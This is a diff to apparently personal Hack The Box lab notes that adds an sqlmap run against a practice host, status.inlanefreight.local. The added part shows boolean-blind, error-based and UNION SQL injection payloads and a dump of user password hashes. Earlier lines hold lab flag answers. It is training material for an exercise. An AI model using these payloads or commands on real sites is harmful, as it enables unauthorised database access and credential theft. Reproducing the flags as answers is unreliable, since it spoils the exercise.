@@ -490,3 +490,81 @@ HTB{32596e8376077c3ef8d5cf52f15279ba}
 ## careers.inlanefreight.local
 
 HTB{8f40ecf17f681612246fa5728c159e46}
+
+## status.inlanefreight.local
+
+```
+sqlmap -r status.txt --technique=BEU --batch --dump
+        ___
+       __H__                                                                                                    
+ ___ ___[.]_____ ___ ___  {1.10.9#stable}                                                                       
+|_ -| . ["]     | .'| . |                                                                                       
+|___|_  ["]_|_|_|__,|  _|                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:54:10 /2026-11-05/
+
+[14:54:10] [INFO] parsing HTTP request from 'status.txt'
+[14:54:10] [INFO] resuming back-end DBMS 'mysql' 
+[14:54:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: searchitem=-6639' OR 5509=5509#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: searchitem=a' AND GTID_SUBSET(CONCAT(0x717a6a6a71,(SELECT (ELT(4643=4643,1))),0x71786b6b71),4643)-- lfrE
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: searchitem=a' UNION ALL SELECT NULL,CONVERT(CONCAT(0x717a6a6a71,0x787447546d5770724553734d78765a49594c4f676662664d646b506f47426b63466a43484b6a6e4a,0x71786b6b71) USING utf8mb4) COLLATE utf8mb4_bin,NULL,NULL#
+---
+[14:54:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.6
+[14:54:10] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[14:54:10] [INFO] fetching current database
+[14:54:10] [WARNING] reflective value(s) found and filtering out
+[14:54:10] [INFO] fetching tables for database: 'status'
+[14:54:11] [INFO] fetching columns for table 'users' in database 'status'
+[14:54:11] [INFO] fetching entries for table 'users' in database 'status'
+Database: status
+Table: users
+[2 entries]
++----+-----------------------------------+----------+
+| id | password                          | username |
++----+-----------------------------------+----------+
+| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
+| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
++----+-----------------------------------+----------+
+
+[14:54:11] [INFO] table '`status`.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local/dump/status/users.csv'                                                                            
+[14:54:11] [INFO] fetching columns for table 'company' in database 'status'
+[14:54:11] [INFO] fetching entries for table 'company' in database 'status'
+Database: status
+Table: company
+[6 entries]
++----+-------------+--------+--------------+
+| id | city        | rating | company_name |
++----+-------------+--------+--------------+
+| 1  | Washington  | 9      | Shiprocket   |
+| 2  | Springfield | 8      | Delhivery    |
+| 3  | Franklin    | 9      | Gati         |
+| 4  | Greenville  | 7      | Ecom Express |
+| 5  | Bristol     | 9      | FedEx        |
+| 6  | Fairview    | 8      | Blue Dart    |
++----+-------------+--------+--------------+
+
+[14:54:11] [INFO] table '`status`.company' dumped to CSV file '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local/dump/status/company.csv'                                                                        
+[14:54:11] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local'                                                                                                    
+
+[*] ending @ 14:54:11 /2026-11-05/
+
+
+```
